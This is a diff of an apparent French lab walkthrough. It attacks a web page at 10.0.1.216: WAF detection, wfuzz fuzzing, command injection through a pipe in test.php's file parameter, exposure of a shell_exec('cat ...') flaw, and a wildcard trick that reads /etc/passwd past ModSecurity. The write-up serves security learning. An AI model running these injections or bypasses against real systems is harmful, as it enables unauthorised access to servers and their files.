@@ -30,8 +30,6 @@ root@debian-10:~#
 Rien de plus que le port 80...
 On va quand même chercher des fichiers avec les extensions php,txt,html en premier :
 
-ICI gobuster ou wfuzz
-
 On va chercher à savoir si il le site est protégé, c'est super bizarre (?) :
 le résultat tombe enfin :
 root@debian-10:~/gitrepo# wafw00f http://10.0.1.216
@@ -52,10 +50,8 @@ Checking http://10.0.1.216
 The site http://10.0.1.216 is behind a ModSecurity (OWASP CRS)
 Number of requests: 11
 
-
 on decouvre l'url http://10.0.1.216/test.php?file=last.html, car on lit le code de la page qui est affichée
 root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=test.php'
-
 
 on va faire u peu de fuzzing pour voir ce qui passe on sait jamais LFI RFI...
 root@debian-10:~/gitrepo# wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/All_attack.txt --sc 200 http://10.0.1.216/test.php?file=FUZZ 
@@ -114,7 +110,6 @@ ID   Response   Lines      Word         Chars          Payload
 Fatal exception: Pycurl error 3: 
 root@debian-10:~/gitrepo# 
 
-
 http://10.0.1.216/test.php?file=last.html|id le 'pipe' passe et on récolte des infos
 uid=33(www-data) gid=33(www-data) groups=33(www-data) 
 
@@ -130,7 +125,6 @@ cat (GNU coreutils) 8.26 Copyright (C) 2016 Free Software Foundation, Inc. Licen
 
 donc ça ressemble à du php qui utilise cat :
  
-
 mais je veux en être sur !! ET C'EST LA que le tricks est bô :
 root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=test.php|rev' | sed '/DOCTYPE/,/<\/html>/d' | rev | head 
 <?php echo shell_exec('cat ' . $_GET['file']);?>
@@ -147,7 +141,7 @@ root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=test.php|rev'
 et la je vois cette ligne :
 <?php echo shell_exec('cat ' . $_GET['file']);?>
 
-pas mal on affiche le code php de la page test.php et surtout la méthode cat !!!!
+pas mal on affiche le code php de la page test.php et surtout comment est utilisé cat !!!!
 On peut donc aussi afficher d'autre choses , bash à la facheuse tendance à remplcer les carractères "*" ou "?"
 root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=/e?c/?asswd' | sed '/DOCTYPE/,/<\/html>/d' 
 root:x:0:0:root:/root:/bin/bash
